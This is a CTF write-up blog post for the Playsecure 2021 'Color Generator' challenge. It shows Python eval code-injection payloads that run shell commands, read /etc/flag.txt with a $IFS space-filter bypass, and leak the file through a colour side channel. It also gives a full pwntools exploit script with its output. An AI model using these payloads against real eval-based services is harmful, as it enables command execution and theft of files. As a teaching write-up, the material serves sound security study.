---
layout: post
title: Playsecure CTF 2021 - Color Generator
---
### Challenge Description

Introducing Color Generator! Enter an expression that returns a number and get a color! This can't be abused! ...right?

Flag is in /etc/flag.txt

Connect to the challenge at exploitation.ps.ctf.ae:2020

<!-- more -->

## Recon

Interacting with the challenge and entering different input to see how it behaves.

![cg00](/assets/playsecure2021/cg00.png)

1. Any positive random number is accepted
2. Any math expression without spaces are allowed
3. Gives a color coding for input number in hex
4. Math expressions are evaluated and hex color code is generated for the result
5. The application most probably is build on python

Below paper (page 3) shows how python expression evaluation can be exploited.
Paper: [Code Injection Paper](https://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_3-Code-Injections.pdf)

## Code Execution
Input basic payload which will import os module and call the function exit.
```python
__import__('os').sys.exit()
```

![cg01](/assets/playsecure2021/cg01.png)

When we enter this expression, the application is terminated. This confirms that we have code execution, but we are blind to its output.

## How can we exfiltrate data?
Python os.system() function will return integer return values depending on the success or failure of the command ran. If system command ran successfully zero is returned.

![cg02](/assets/playsecure2021/cg02.png)

1. Running id command with os.system : `__import__('os').system('id')`
2. Return value 0
3. Assigning return value to a variable
4. Printing the return value, this is also 0


Testing this against the challenge server.

![cg03](/assets/playsecure2021/cg03.png)

We will generate color code for number 0 and the also will also give  `__import__('os').system('id')` expression as input.
1. Color code for 0
2. Giving expression which will run whoami command, if successfull, will return 0.
3. We get color code for 0

## Exfiltrating File Content/Command Output

We can use subrocess.check_output() function to run commands and get its output as return value. Below snippets shows a local install of Python3.

![cg04](/assets/playsecure2021/cg04.png)

1. Using subprocess.check_output() to get the contents of /etc/shells file.
2. Converting the output to string and replacing the new line
3. Taking the 0'th character of the output -> #
4. Taking ascii of the 0'th character -> ASCII('#') = 35
5. Returns 35

```python3
>>> __import__('subprocess').check_output('/bin/cat$IFS/etc/shells',shell=True)
b'# /etc/shells: valid login shells\n/bin/sh\n/bin/bash\n/usr/bin/bash\n/bin/rbash\n/usr/bin/rbash\n/bin/dash\n/usr/bin/dash\n/bin/zsh\n/usr/bin/zsh\n/usr/bin/tmux\n/usr/bin/screen\n'
>>> 
>>> __import__('subprocess').check_output('/bin/cat$IFS/etc/shells',shell=True).decode('utf-8').rstrip('\n')
'# /etc/shells: valid login shells\n/bin/sh\n/bin/bash\n/usr/bin/bash\n/bin/rbash\n/usr/bin/rbash\n/bin/dash\n/usr/bin/dash\n/bin/zsh\n/usr/bin/zsh\n/usr/bin/tmux\n/usr/bin/screen'
>>> 
>>> __import__('subprocess').check_output('/bin/cat$IFS/etc/shells',shell=True).decode('utf-8').rstrip('\n')[0]
'#'
>>> 
>>> ord(__import__('subprocess').check_output('/bin/cat$IFS/etc/shells',shell=True).decode('utf-8').rstrip('\n')[0])
35
>>> 
```

Testing Against Challenge Server:

![cg05](/assets/playsecure2021/cg05.png)

1. Giving input 35 and getting its color code.
2. Giving input `ord(__import__('subprocess').check_output('/bin/cat$IFS/etc/shells',shell=True).decode('utf-8').rstrip('\n')[0])` to get the ascii of 0'th character which should be #.

Both results in same color code.

## Exfiltrating FLAG: /etc/flag.txt

![cg06](/assets/playsecure2021/cg06.png)

We know flag is in format CTFAE{XXXXXX}. The 0th character is 'C' and its ascii is 67.

1. Color code for 0'th character of /etc/flag.txt: `ord(__import__('subprocess').check_output('/bin/cat$IFS/etc/flag.txt',shell=True).decode('utf-8').rstrip('\n')[0])`
2. Color code for 67 = C

Both are same. So we can use this method to exfiltrate all flag contents. I'm assuming flag length is about 40. (Found that length is 34 during testing, adjusted in script below)

## Proof of Concept Script For Flag Exfiltration

1. Gets all color codes for all printable characters and saves in a dictionary with color as key as value as character.
2. Reads color codes for each character of flag.
3. Converts the flag characters color code to string using the dictionary from step 1
4. Print flag.

```python
# Author: Rizal Muhammed ~ rizaru ~ UB3RSiCK
# Date: 27 March 2021
# Desc: Playsecure ctf Color Generator exploitation solution

import string
from pwn import *

cb = string.printable

conn = remote('exploitation.ps.ctf.ae',2020)
r = conn.recvuntil("> ")

d = {}

print (r)

print "[*] Dumping Colors for all printable characters"
for i in range(len(cb)):
	conn.sendline(str(ord(cb[i])))
	color =  conn.recvline()
	color = color.rstrip('\n').replace(">","").replace(" ","")
	d[color] = cb[i]
	print color

print "[+] Colors for all printable characters"
print (d)

payload = "ord(__import__('subprocess').check_output('/bin/cat$IFS/etc/flag.txt',shell=True).decode('utf-8').rstrip('\\n')[%s])"

t= []

print "[*] Dumping Colors for all /etc/flag.txt characters"


for i in range(0,35,1):
	p = payload % i
#	print p

	conn.sendline(p)
	color =  conn.recvline()
	color = color.rstrip('\n').replace(">","").replace(" ","")
	print color
	try:
		t.append(d[color])
		
	except:
		print "ERrro"
print ''.join(t)
```

Running the PoC:

![cg07](/assets/playsecure2021/cg07.png)

Flag:

![cg08](/assets/playsecure2021/cg08.png)

*Flag: CTFAE{ThatWasSomeGreatExfiltration}*

## Full Script Output

```bash
kali@kali:~/Desktop/CTF/playsecure.ctf.ae-mar262021/exploitation/colorgen$ python colgen.py 
[+] Opening connection to exploitation.ps.ctf.ae on port 2020: Done
Welcome to ColorGenerator!
---------------------
We currently only have 256 quotes available. All inputs are mod 256!
Enter a positive random number or math expression (no spaces allowed) to get a random color!

> 
[*] Dumping Colors for all printable characters
#944aba
#eaa954
#876ae8
#0cce19
#a1fcbb
#fc85de
#c4e520
#e2cb7c
#f2c9ff
#ea844d
#5dce21
#07676b
#3574a5
#a4ce18
#ef89f4
#a3c932
#8390f7
#f99c89
#db4ed6
#cbc6ff
#23e036
#f4ff99
#63f29a
#0679aa
#63e244
#1d0bbf
#ce795c
#8bef90
#62db94
#f91bdf
#69e06d
#ef88c8
#77ffb2
#8d65ce
#f2d380
#a17ae8
#5d94d3
#f9be66
#f7d8a3
#13177c
#f4bac3
#fcfc5f
#0ad6a3
#ed9509
#85f2af
#cc1ea9
#0e32ea
#2498ad
#3ac94f
#b1ed89
#9cc41b
#31f971
#5829bc
#a0cc10
#331c7f
#a6fcca
#a5ed87
#bc3b10
#deff75
#7cb8dd
#eaa207
#abf490
#dd8aea
#aa58fc
#8f44b5
#95eddb
#8e041d
#ef40a0
#74e554
#061068
#459bb7
#e094be
#e28c63
#1a6fbf
#27e563
#b58834
#acefef
#e27fe8
#a3ff99
#51efb3
#a08af2
#d480dd
#2743a5
#a19df2
#bf8809
#1b61c4
#3b11d6
#ab72c9
#9224f2
#56c5d8
#dd9966
#006625
#6bff74
#f6baff
#e0bb76
#040ed1
#f4bffc
#51f772
#1535ea
#6d69e5
[+] Colors for all printable characters
{'#abf490': 'Z', '#7cb8dd': 'X', '#8bef90': 'r', '#51f772': '\r', '#f99c89': 'h', '#f91bdf': 't', '#a6fcca': 'T', '#876ae8': '2', '#cc1ea9': 'J', '#a17ae8': 'z', '#27e563': '-', '#ef88c8': 'v', '#bf8809': '[', '#5dce21': 'a', '#fc85de': '5', '#8e041d': '%', '#f2c9ff': '8', '#c4e520': '6', '#9224f2': '_', '#77ffb2': 'w', '#ef89f4': 'e', '#fcfc5f': 'F', '#69e06d': 'u', '#07676b': 'b', '#331c7f': 'S', '#2498ad': 'L', '#13177c': 'D', '#d480dd': '>', '#8390f7': 'g', '#deff75': 'W', '#e094be': '*', '#8f44b5': '#', '#51efb3': '<', '#e0bb76': ' ', '#0ad6a3': 'G', '#f4ff99': 'l', '#2743a5': '?', '#63f29a': 'm', '#0679aa': 'n', '#db4ed6': 'i', '#a4ce18': 'd', '#5829bc': 'Q', '#6d69e5': '\x0c', '#1a6fbf': ',', '#b1ed89': 'N', '#a5ed87': 'U', '#3574a5': 'c', '#ef40a0': '&', '#8d65ce': 'x', '#cbc6ff': 'j', '#a1fcbb': '4', '#acefef': '/', '#62db94': 's', '#f2d380': 'y', '#f4bffc': '\n', '#9cc41b': 'O', '#0cce19': '3', '#1b61c4': '\\', '#a3ff99': ';', '#061068': '(', '#e27fe8': ':', '#95eddb': '$', '#ab72c9': '^', '#1d0bbf': 'p', '#0e32ea': 'K', '#459bb7': ')', '#6bff74': '}', '#1535ea': '\x0b', '#f9be66': 'B', '#dd9966': '{', '#aa58fc': '"', '#31f971': 'P', '#85f2af': 'I', '#56c5d8': '`', '#f7d8a3': 'C', '#5d94d3': 'A', '#eaa954': '1', '#ce795c': 'q', '#23e036': 'k', '#a08af2': '=', '#a0cc10': 'R', '#006625': '|', '#bc3b10': 'V', '#63e244': 'o', '#a19df2': '@', '#e2cb7c': '7', '#3b11d6': ']', '#a3c932': 'f', '#ed9509': 'H', '#e28c63': '+', '#f6baff': '~', '#944aba': '0', '#040ed1': '\t', '#74e554': "'", '#3ac94f': 'M', '#f4bac3': 'E', '#ea844d': '9', '#eaa207': 'Y', '#b58834': '.', '#dd8aea': '!'}
[*] Dumping Colors for all /etc/flag.txt characters
#f7d8a3
#a6fcca
#fcfc5f
#5d94d3
#f4bac3
#dd9966
#a6fcca
#f99c89
#5dce21
#f91bdf
#deff75
#5dce21
#62db94
#331c7f
#63e244
#63f29a
#ef89f4
#0ad6a3
#8bef90
#ef89f4
#5dce21
#f91bdf
#f4bac3
#8d65ce
#a3c932
#db4ed6
#f4ff99
#f91bdf
#8bef90
#5dce21
#f91bdf
#db4ed6
#63e244
#0679aa
#6bff74
CTFAE{ThatWasSomeGreatExfiltration}
[*] Closed connection to exploitation.ps.ctf.ae port 2020
```
